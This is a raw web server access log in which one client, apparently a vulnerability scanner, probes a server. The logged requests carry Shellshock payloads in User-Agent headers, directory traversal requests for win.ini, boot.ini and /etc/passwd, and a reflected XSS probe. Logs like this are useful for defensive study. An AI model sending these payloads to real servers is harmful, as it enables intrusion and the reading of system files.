191.96.249.54 - - [27/Jun/2016:00:00:38 +0000] "GET / HTTP/1.1" 302 237 "-" "-" 38 493
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 369 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 417 406 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 362 629
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /_mt/mt.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 362 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /admin.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /axis/DirectDownload.jsp HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 332 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /administrator.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /buglist.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /axis/DirectDownload.jsp HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi/mid.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /enter.php?goto=%2F HTTP/1.1" 302 248 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 327 571
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 351 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /_mt/mt.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 361 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /admin.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 360 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /administrator.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /buglist.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 362 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi/mid.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 362 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.pl HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /enter.php?goto=%2F HTTP/1.1" 302 248 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4638
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 369 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/count.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/Count.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/count.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 371 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/Count.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /logon?onok=%22%3e%3cscript%3ealert('axon_logon_xss.nasl')%3c%2fscript%3e HTTP/1.1" 302 318 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 381 711
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/help.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/hi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 361 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.pl HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.sh HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mailit.pl HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /logon?onok=%22%3e%3cscript%3ealert('axon_logon_xss.nasl')%3c%2fscript%3e HTTP/1.1" 302 318 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 787 4782
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 381 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 380 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/help.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/search HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/hi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/search.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 369 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/search/search.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 376 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/test.sh HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 366 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /status.xsl. HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 320 549
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/upload.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 369 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 371 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/index.sh HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 370 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/wa HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 361 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mailit.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/wa.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /status.xsl. HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/wa.exe HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/whois.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin-sdb/printenv HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 371 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-mod/index.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 377 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 803 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 376 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /index.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 360 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /index.pl HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 359 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /index.sh HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 359 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /search?NS-query-pat=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini HTTP/1.1" 302 306 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 366 687
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /nph-mr.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 361 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 302 288 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 366 650
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /query.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 360 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /session_login.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 787 4622
137.78.237.22 - - [27/Jun/2016:22:40:42 +0000] "GET /show_bug.cgi HTTP/1.1" 302 237 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((11+63))\"" 363 548
